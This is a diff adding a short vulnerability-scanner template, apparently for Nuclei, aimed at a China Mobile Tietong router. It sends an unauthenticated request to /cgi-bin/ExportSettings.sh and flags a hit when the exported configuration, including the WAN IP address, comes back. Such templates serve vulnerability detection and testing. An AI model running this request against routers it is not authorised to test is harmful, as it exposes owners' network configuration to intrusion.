@@ -1,0 +1,22 @@
+id: ZYTT-ExportSettings-Info
+
+info:
+  name: 中移铁通禹路由器-信息泄露-ExportSettings
+  author: ZYTT
+  severity: high
+variables:
+  filename: "{{to_lower(rand_base(5))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+http:
+  - raw:
+      - |
+        GET /cgi-bin/ExportSettings.sh HTTP/1.1
+        Host:{{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Length: 0
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"wan_ipaddr","HostName")
